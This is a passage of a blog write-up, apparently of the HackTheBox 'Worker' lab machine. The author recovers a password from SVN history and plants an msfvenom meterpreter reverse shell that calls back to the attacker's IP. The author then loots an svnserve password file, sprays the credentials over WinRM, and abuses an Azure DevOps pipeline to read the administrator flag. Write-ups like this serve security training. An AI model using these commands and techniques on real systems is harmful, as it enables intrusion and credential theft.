Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1
Revision: 5
Node Kind: directory
Last Changed Author: nathen
Last Changed Rev: 5
Last Changed Date: 2020-06-20 15:52:00 +0200 (Sat, 20 Jun 2020)
</code></pre><p>Let&rsquo;s use the command to <a href=http://svnbook.red-bean.com/en/1.8/svn.ref.svn.c.list.html>list directory entries in the repository</a>:</p><pre tabindex=0><code>$ svn list svn://worker.htb
dimension.worker.htb/
moved.tx
</code></pre><p>Let&rsquo;s <a href=http://svnbook.red-bean.com/en/1.8/svn.ref.svn.c.export.html>export a clean directory tree from the repository specified by URL</a>:</p><pre tabindex=0><code>$ mkdir svn &amp;&amp; cd svn &amp;&amp; svn export --force svn://worker.htb
A    .
A    dimension.worker.htb
A    dimension.worker.htb/LICENSE.txt
A    dimension.worker.htb/README.txt
A    dimension.worker.htb/assets
A    dimension.worker.htb/assets/css
A    dimension.worker.htb/assets/css/fontawesome-all.min.css
A    dimension.worker.htb/assets/css/main.css
A    dimension.worker.htb/assets/css/noscript.css
A    dimension.worker.htb/assets/js
A    dimension.worker.htb/assets/js/breakpoints.min.js
A    dimension.worker.htb/assets/js/browser.min.js
A    dimension.worker.htb/assets/js/jquery.min.js
A    dimension.worker.htb/assets/js/main.js
A    dimension.worker.htb/assets/js/util.js
A    dimension.worker.htb/assets/sass
A    dimension.worker.htb/assets/sass/base
A    dimension.worker.htb/assets/sass/base/_page.scss
A    dimension.worker.htb/assets/sass/base/_reset.scss
A    dimension.worker.htb/assets/sass/base/_typography.scss
A    dimension.worker.htb/assets/sass/components
A    dimension.worker.htb/assets/sass/components/_actions.scss
A    dimension.worker.htb/assets/sass/components/_box.scss
A    dimension.worker.htb/assets/sass/components/_button.scss
A    dimension.worker.htb/assets/sass/components/_form.scss
A    dimension.worker.htb/assets/sass/components/_icon.scss
A    dimension.worker.htb/assets/sass/components/_icons.scss
A    dimension.worker.htb/assets/sass/components/_image.scss
A    dimension.worker.htb/assets/sass/components/_list.scss
A    dimension.worker.htb/assets/sass/components/_table.scss
A    dimension.worker.htb/assets/sass/layout
A    dimension.worker.htb/assets/sass/layout/_bg.scss
A    dimension.worker.htb/assets/sass/layout/_footer.scss
A    dimension.worker.htb/assets/sass/layout/_header.scss
A    dimension.worker.htb/assets/sass/layout/_main.scss
A    dimension.worker.htb/assets/sass/layout/_wrapper.scss
A    dimension.worker.htb/assets/sass/libs
A    dimension.worker.htb/assets/sass/libs/_breakpoints.scss
A    dimension.worker.htb/assets/sass/libs/_functions.scss
A    dimension.worker.htb/assets/sass/libs/_mixins.scss
A    dimension.worker.htb/assets/sass/libs/_vars.scss
A    dimension.worker.htb/assets/sass/libs/_vendor.scss
A    dimension.worker.htb/assets/sass/main.scss
A    dimension.worker.htb/assets/sass/noscript.scss
A    dimension.worker.htb/assets/webfonts
A    dimension.worker.htb/assets/webfonts/fa-brands-400.eot
A    dimension.worker.htb/assets/webfonts/fa-brands-400.svg
A    dimension.worker.htb/assets/webfonts/fa-brands-400.ttf
A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff
A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff2
A    dimension.worker.htb/assets/webfonts/fa-regular-400.eot
A    dimension.worker.htb/assets/webfonts/fa-regular-400.svg
A    dimension.worker.htb/assets/webfonts/fa-regular-400.ttf
A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff
A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff2
A    dimension.worker.htb/assets/webfonts/fa-solid-900.eot
A    dimension.worker.htb/assets/webfonts/fa-solid-900.svg
A    dimension.worker.htb/assets/webfonts/fa-solid-900.ttf
A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff
A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff2
A    dimension.worker.htb/images
A    dimension.worker.htb/images/bg.jpg
A    dimension.worker.htb/images/overlay.png
A    dimension.worker.htb/images/pic01.jpg
A    dimension.worker.htb/images/pic02.jpg
A    dimension.worker.htb/images/pic03.jpg
A    dimension.worker.htb/index.html
A    moved.txt
Exported revision 5.
</code></pre><p>Let&rsquo;s see the first one, which is explicit:</p><pre tabindex=0><code>$ cat moved.txt
This repository has been migrated and will no longer be maintained here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :)
</code></pre><p>On the other repository we can find a showcase website that is listing some
projects and that can give us new sub-domains:</p><pre tabindex=0><code>$ lynx -dump -listonly -nonumbers dimension.worker.htb/index.html | grep http
http://alpha.worker.htb/
http://cartoon.worker.htb/
http://lens.worker.htb/
http://solid-state.worker.htb/
http://spectral.worker.htb/
http://story.worker.htb/
https://html5up.net/
</code></pre><p>If we go at <a href=http://devops.worker.htb>http://devops.worker.htb</a> it ask some credentials for basic auth.
But we have none yet.</p><p>But we saw earlier there was 5 revisions so there may be information in a
previous revision.</p><pre tabindex=0><code>$ svn list -r 3 svn://worker.htb
deploy.ps1
dimension.worker.htb/
</code></pre><p>Cool, we have found a powershell script.</p><pre tabindex=0><code>$ svn checkout -r 3 svn://worker.htb
</code></pre><p><code>deploy.ps1</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$user = <span style=color:#e6db74>&#34;nathen&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># NOTE: We cant have my password here!!!</span>
</span></span><span style=display:flex><span>$plain = <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>$pwd = ($plain | ConvertTo-SecureString)
</span></span><span style=display:flex><span>$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
</span></span><span style=display:flex><span>$args = <span style=color:#e6db74>&#34;Copy-Site.ps1&#34;</span>
</span></span><span style=display:flex><span>Start-Process powershell.exe -Credential $Credential -ArgumentList (<span style=color:#e6db74>&#34;-file </span>$args<span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></div><p>No password here, let&rsquo;s check another revision:</p><pre tabindex=0><code>$ svn checkout -r 2 svn://worker.htb
U    deploy.ps1
Checked out revision 2.
</code></pre><p><code>deploy.ps1</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$user = <span style=color:#e6db74>&#34;nathen&#34;</span>
</span></span><span style=display:flex><span>$plain = <span style=color:#e6db74>&#34;wendel98&#34;</span>
</span></span><span style=display:flex><span>$pwd = ($plain | ConvertTo-SecureString)
</span></span><span style=display:flex><span>$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
</span></span><span style=display:flex><span>$args = <span style=color:#e6db74>&#34;Copy-Site.ps1&#34;</span>
</span></span><span style=display:flex><span>Start-Process powershell.exe -Credential $Credential -ArgumentList (<span style=color:#e6db74>&#34;-file </span>$args<span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></div><p>This time the password is here. We can connect with those credentials to
<a href=http://devops.worker.htb/>http://devops.worker.htb/</a>.</p><h2 id=exploiting-azure-devops>Exploiting Azure DevOps<a hidden class=anchor aria-hidden=true href=#exploiting-azure-devops>#</a></h2><p>We have access to a repository <a href=http://devops.worker.htb/ekenas/SmartHotel360>http://devops.worker.htb/ekenas/SmartHotel360</a></p><p>Look at the different projects we have access to:</p><p>A lot of them are matching the sub-domains we found earlier</p><pre tabindex=0><code>alpha.worker.htb
cartoon.worker.htb
lens.worker.htb
solid-state.worker.htb
spectral.worker.htb
story.worker.htb
</code></pre><p>All those domains are hosting a web application and we can control the source,
so we&rsquo;ll be able to upload a reverse shell to the master branch and access it
wia the web application.</p><p>First, let&rsquo;s generate an ASPX reverse shell:</p><pre tabindex=0><code>$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform windows --encoder generic/none LHOST=10.10.14.174 LPORT=9999 -f aspx &gt; cyfun.aspx
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none succeeded with size 510 (iteration=0)
generic/none chosen with final size 510
Payload size: 510 bytes
Final size of aspx file: 3663 bytes
</code></pre><p>Here a few steps I won&rsquo;t details too much.</p><ol><li>Select a project, eg. Alpha</li><li>Create a new branch</li><li>Upload the reverse shell to the branch (eg. in assets folder)</li><li>Create a PR</li><li>Match merge policies: approve and link a work item</li><li>Complete the PR (merge)</li></ol><p>Start a listener:</p><pre tabindex=0><code>msf5 exploit(multi/handler) &gt; options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
   LHOST     10.10.14.174     yes       The listen address (an interface may be specified)
   LPORT     9999             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf5 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 10.10.14.174:9999
[*] Sending stage (201283 bytes) to 10.10.10.203
[*] Meterpreter session 1 opened (10.10.14.174:9999 -&gt; 10.10.10.203:55557) at 2020-10-21 20:33:24 +0200

meterpreter &gt;
</code></pre><p>Access the reverse shell & enjoy the meterpreter <a href=http://alpha.worker.htb/assets/cyfun.aspx>http://alpha.worker.htb/assets/cyfun.aspx</a></p><h2 id=privilege-escalation-of-machine--from-iis-apppooldefaultapppool-to-robisl>Privilege Escalation of Machine : from iis apppool\defaultapppool to robisl<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-iis-apppooldefaultapppool-to-robisl>#</a></h2><pre tabindex=0><code>meterpreter &gt; shell
Process 8920 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1282]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv&gt;whoami
iis apppool\defaultapppool
</code></pre><p>Let&rsquo;s <a href=https://superuser.com/questions/139899/see-available-drives-from-windows-cli>list the available drives</a>:</p><pre tabindex=0><code>c:\windows\system32\inetsrv&gt;wmic logicaldisk get volumename,name,caption
Caption  Name  VolumeName
C:       C:
W:       W:    Work

c:\windows\system32\inetsrv&gt;fsutil fsinfo drives

Drives: C:\ W:\
</code></pre><p>We have an unusual drive with label W:</p><pre tabindex=0><code>c:\windows\system32\inetsrv&gt;ls w:\
AzureDevOpsData
System Volume Information
agents
sites
svnrepos
</code></pre><p>Using a <a href=https://guif.re/windowseop#pe%203:%20ClearText%20passwords%20(quick%20hits)>Guifre</a> technique to quickly loot password I found a promising file:</p><pre tabindex=0><code>c:\windows\system32\inetsrv&gt;dir w:\ /s /b | findstr /si pass*
...
w:\svnrepos\www\conf\passwd

c:\windows\system32\inetsrv&gt;cat w:\svnrepos\www\conf\passwd
### This file is an example password file for svnserve.
### Its format is similar to that of svnserve.conf. As shown in the
### example below it contains one section labelled [users].
### The name and password for each user follow, one account per line.

[users]
nathen = wendel98
nichin = fqerfqerf
nichin = asifhiefh
noahip = player
nuahip = wkjdnw
oakhol = bxwdjhcue
owehol = supersecret
paihol = painfulcode
parhol = gitcommit
pathop = iliketomoveit
pauhor = nowayjose
payhos = icanjive
perhou = elvisisalive
peyhou = ineedvacation
phihou = pokemon
quehub = pickme
quihud = kindasecure
rachul = guesswho
raehun = idontknow
ramhun = thisis
ranhut = getting
rebhyd = rediculous
reeinc = iagree
reeing = tosomepoint
reiing = isthisenough
renipr = dummy
rhiire = users
riairv = canyou
ricisa = seewhich
robish = onesare
robisl = wolves11
robive = andwhich
ronkay = onesare
rubkei = the
rupkel = sheeps
ryakel = imtired
sabken = drjones
samken = aqua
sapket = hamburger
sarkil = friday
</code></pre><p>Wow tons of creds.</p><p>Let&rsquo;s put username and password in files.</p><p>I&rsquo;ll use [crackmaexec][cme] for password spraying.</p><blockquote><p>&ndash;no-bruteforce - No spray when using file for username and password (user1 => password1, user2 => password2</p><p>&ndash;continue-on-success - continues authentication attempts even after successes</p></blockquote><pre tabindex=0><code>$ cme winrm 10.10.10.203 --no-bruteforce -u usernames.txt -p passwords.txt --continue-on-success
WINRM       10.10.10.203    5985   NONE             [*] None (name:10.10.10.203) (domain:None)
WINRM       10.10.10.203    5985   NONE             [*] http://10.10.10.203:5985/wsman
WINRM       10.10.10.203    5985   NONE             [-] None\nathen:wendel98
WINRM       10.10.10.203    5985   NONE             [-] None\nichin:fqerfqerf
WINRM       10.10.10.203    5985   NONE             [-] None\nichin:asifhiefh
WINRM       10.10.10.203    5985   NONE             [-] None\noahip:player
WINRM       10.10.10.203    5985   NONE             [-] None\nuahip:wkjdnw
WINRM       10.10.10.203    5985   NONE             [-] None\oakhol:bxwdjhcue
WINRM       10.10.10.203    5985   NONE             [-] None\owehol:supersecret
WINRM       10.10.10.203    5985   NONE             [-] None\paihol:painfulcode
WINRM       10.10.10.203    5985   NONE             [-] None\parhol:gitcommit
WINRM       10.10.10.203    5985   NONE             [-] None\pathop:iliketomoveit
WINRM       10.10.10.203    5985   NONE             [-] None\pauhor:nowayjose
WINRM       10.10.10.203    5985   NONE             [-] None\payhos:icanjive
WINRM       10.10.10.203    5985   NONE             [-] None\perhou:elvisisalive
WINRM       10.10.10.203    5985   NONE             [-] None\peyhou:ineedvacation
WINRM       10.10.10.203    5985   NONE             [-] None\phihou:pokemon
WINRM       10.10.10.203    5985   NONE             [-] None\quehub:pickme
WINRM       10.10.10.203    5985   NONE             [-] None\quihud:kindasecure
WINRM       10.10.10.203    5985   NONE             [-] None\rachul:guesswho
WINRM       10.10.10.203    5985   NONE             [-] None\raehun:idontknow
WINRM       10.10.10.203    5985   NONE             [-] None\ramhun:thisis
WINRM       10.10.10.203    5985   NONE             [-] None\ranhut:getting
WINRM       10.10.10.203    5985   NONE             [-] None\rebhyd:rediculous
WINRM       10.10.10.203    5985   NONE             [-] None\reeinc:iagree
WINRM       10.10.10.203    5985   NONE             [-] None\reeing:tosomepoint
WINRM       10.10.10.203    5985   NONE             [-] None\reiing:isthisenough
WINRM       10.10.10.203    5985   NONE             [-] None\renipr:dummy
WINRM       10.10.10.203    5985   NONE             [-] None\rhiire:users
WINRM       10.10.10.203    5985   NONE             [-] None\riairv:canyou
WINRM       10.10.10.203    5985   NONE             [-] None\ricisa:seewhich
WINRM       10.10.10.203    5985   NONE             [-] None\robish:onesare
WINRM       10.10.10.203    5985   NONE             [+] None\robisl:wolves11 (Pwn3d!)
WINRM       10.10.10.203    5985   NONE             [-] None\robive:andwhich
WINRM       10.10.10.203    5985   NONE             [-] None\ronkay:onesare
WINRM       10.10.10.203    5985   NONE             [-] None\rubkei:the
WINRM       10.10.10.203    5985   NONE             [-] None\rupkel:sheeps
WINRM       10.10.10.203    5985   NONE             [-] None\ryakel:imtired
WINRM       10.10.10.203    5985   NONE             [-] None\sabken:drjones
WINRM       10.10.10.203    5985   NONE             [-] None\samken:aqua
WINRM       10.10.10.203    5985   NONE             [-] None\sapket:hamburger
WINRM       10.10.10.203    5985   NONE             [-] None\sarkil:friday
</code></pre><p>So we have only one set of valid credentials: <code>robisl:wolves11</code>.</p><p>Now let&rsquo;s connect with [evil-winrm][evil-winrm]:</p><pre tabindex=0><code>$ evil-winrm -u robisl -p wolves11 -i 10.10.10.203

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\robisl\Documents&gt; cd ..
*Evil-WinRM* PS C:\Users\robisl&gt; gc Desktop/user.txt
571ead91c15070e615b5882f25bad03d
</code></pre><h2 id=privilege-escalation-of-machine--from-robisl-to-administrator>Privilege Escalation of Machine : from robisl to Administrator<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-robisl-to-administrator>#</a></h2><p>We can enumerate a bit but there is nothing more we can see with robisl than
we were able to see with the IIS account.</p><p>So lets go back to <a href=http://devops.worker.htb>http://devops.worker.htb</a>, sign out and sign in back as
robisl.</p><p>Now we can see a different project than earlier:
<a href=http://devops.worker.htb/ekenas/PartsUnlimited>http://devops.worker.htb/ekenas/PartsUnlimited</a></p><p>This time we don&rsquo;t have a PartsUnlimited sub-domain, there is a lot of files in
the repository but nothing seems useful.</p><p>As an everyday user of GitLab I know I can run some tests in a docker thanks
to the integrated GitLab CI pipeline (no need to configure an external CI) that
yo ucan configure through <code>.gitlab-ci.yml</code>.</p><p>It seems Azure Devops has a similar feature: New Pipeline > Azure Repos Git > PartsUnlimited > Starter Pipeline > <code>azure-pipelines.yml</code>.</p><p>We are welcomed with a default template:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#75715e># Starter pipeline</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Start with a minimal pipeline that you can customize to build and deploy your code.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Add steps that build, run tests, deploy, and more:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># https://aka.ms/yaml</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>trigger</span>:
</span></span><span style=display:flex><span>- <span style=color:#ae81ff>master</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>pool</span>: <span style=color:#e6db74>&#39;Default&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>steps</span>:
</span></span><span style=display:flex><span>- <span style=color:#f92672>script</span>: <span style=color:#ae81ff>echo Hello, world!</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>displayName</span>: <span style=color:#e6db74>&#39;Run a one-line script&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>- <span style=color:#f92672>script</span>: |<span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    echo Add other tasks to build, test, and deploy your project.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    echo See https://aka.ms/yaml</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>displayName</span>: <span style=color:#e6db74>&#39;Run a multi-line script&#39;</span>
</span></span></code></pre></div><p>Let&rsquo;s create a new reverse shell (an exe this time).</p><pre tabindex=0><code>$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform windows --encoder generic/none LHOST=10.10.14.174 LPORT=9999 -f raw &gt; cyfun.exe
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none succeeded with size 510 (iteration=0)
generic/none chosen with final size 510
Payload size: 510 bytes
</code></pre><p>Start a listener aagain:</p><pre tabindex=0><code>msf5 exploit(multi/handler) &gt; options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
   LHOST     10.10.14.174     yes       The listen address (an interface may be specified)
   LPORT     9999             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
</code></pre><p>[evil-winrm][evil-winrm] allows us to upload a file:</p><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\robisl\Downloads&gt; upload /home/cyfun/CTF/HackTheBox/machines/Worker/cyfun.exe
Info: Uploading /home/cyfun/CTF/HackTheBox/machines/Worker/cyfun.exe to C:\Users\robisl\Downloads\cyfun.exe

Data: 680 bytes of 680 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\robisl\Downloads&gt; pwd

Path
----
C:\Users\robisl\Downloads
</code></pre><p>Now modify the template pipelien to</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#75715e># Starter pipeline</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Start with a minimal pipeline that you can customize to build and deploy your code.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Add steps that build, run tests, deploy, and more:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># https://aka.ms/yaml</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>trigger</span>:
</span></span><span style=display:flex><span>- <span style=color:#ae81ff>master</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>pool</span>: <span style=color:#e6db74>&#39;Default&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>steps</span>:
</span></span><span style=display:flex><span>- <span style=color:#f92672>script</span>: <span style=color:#ae81ff>C:\Users\robisl\Downloads\cyfun.exe</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>displayName</span>: <span style=color:#e6db74>&#39;cyfun&#39;</span>
</span></span></code></pre></div><p>Then save and run to a new branch and PR to master.</p><p>When the pipeline ran I got an error:</p><pre tabindex=0><code>The pipeline is not valid. Could not find a pool with name Default. The pool does not exist or has not been authorized for use.
</code></pre><p>Going to <a href=http://devops.worker.htb/ekenas/PartsUnlimited/_settings/agentqueues>http://devops.worker.htb/ekenas/PartsUnlimited/_settings/agentqueues</a>
I was there was an Agent pool named <code>Setup</code> that was owner by the administrator.</p><p>So I changed my template to the following and created a new pipeline:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#75715e># Starter pipeline</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Start with a minimal pipeline that you can customize to build and deploy your code.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Add steps that build, run tests, deploy, and more:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># https://aka.ms/yaml</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>trigger</span>:
</span></span><span style=display:flex><span>- <span style=color:#ae81ff>master</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>pool</span>: <span style=color:#e6db74>&#39;Setup&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>steps</span>:
</span></span><span style=display:flex><span>- <span style=color:#f92672>script</span>: <span style=color:#ae81ff>C:\Users\robisl\Downloads\cyfun.exe</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>displayName</span>: <span style=color:#e6db74>&#39;cyfun&#39;</span>
</span></span></code></pre></div><p>Here is the execution of the pipeline task &ldquo;cyfun&rdquo;:</p><pre tabindex=0><code>##[section]Starting: cyfun
==============================================================================
Task         : Command line
Description  : Run a command line script using Bash on Linux and macOS and cmd.exe on Windows
Version      : 2.151.1
Author       : Microsoft Corporation
Help         : https://docs.microsoft.com/azure/devops/pipelines/tasks/utility/command-line
==============================================================================
Generating script.
Script contents:
C:\Users\robisl\Downloads\cyfun.exe
========================== Starting Command Output ===========================
##[command]&#34;C:\Windows\system32\cmd.exe&#34; /D /E:ON /V:OFF /S /C &#34;CALL &#34;w:\agents\agent11\_work\_temp\31fb30ee-8d29-41e3-9ab0-529b331cef0e.cmd&#34;&#34;
##[error]This version of C:\Users\robisl\Downloads\cyfun.exe is not compatible with the version of Windows you&#39;re running. Check your computer&#39;s system information and then contact the software publisher.
##[error]Cmd.exe exited with code &#39;1&#39;.
##[section]Finishing: cyfun
</code></pre><p>Seems to be the wrong architecture.</p><p>So I created a 32 bits reverse shell instead of a 64 bits one:</p><pre tabindex=0><code>$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows --encoder generic/none LHOST=10.10.14.174 LPORT=9999 -f raw &gt; cyfun.exe
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none succeeded with size 341 (iteration=0)
generic/none chosen with final size 341
Payload size: 341 bytes
</code></pre><p>Same error again, ok let&rsquo;s forget the shell, let&rsquo;s just display the root
flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#f92672>trigger</span>:
</span></span><span style=display:flex><span>- <span style=color:#ae81ff>master</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>pool</span>: <span style=color:#e6db74>&#39;Setup&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>steps</span>:
</span></span><span style=display:flex><span>- <span style=color:#f92672>script</span>: <span style=color:#ae81ff>type C:\Users\Administrator\Desktop\root.txt</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>displayName</span>: <span style=color:#e6db74>&#39;cyfun&#39;</span>
</span></span></code></pre></div><p>Here are the logs of our pipeline task build:</p><pre tabindex=0><code>##[section]Starting: cyfun
==============================================================================
Task         : Command line
Description  : Run a command line script using Bash on Linux and macOS and cmd.exe on Windows
Version      : 2.151.1
Author       : Microsoft Corporation
Help         : https://docs.microsoft.com/azure/devops/pipelines/tasks/utility/command-line
==============================================================================
Generating script.
Script contents:
type C:\Users\Administrator\Desktop\root.txt
========================== Starting Command Output ===========================
##[command]&#34;C:\Windows\system32\cmd.exe&#34; /D /E:ON /V:OFF /S /C &#34;CALL &#34;w:\agents\agent11\_work\_temp\d9359887-a4ac-49ad-9865-3e9b9024f109.cmd&#34;&#34;
c8d6aeda24c4e17abcc72f26dedbe919
##[section]Finishing: cyfun
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/windows/>Windows</a></li><li><a href=https://s4ch.github.io/tags/medium/>Medium</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>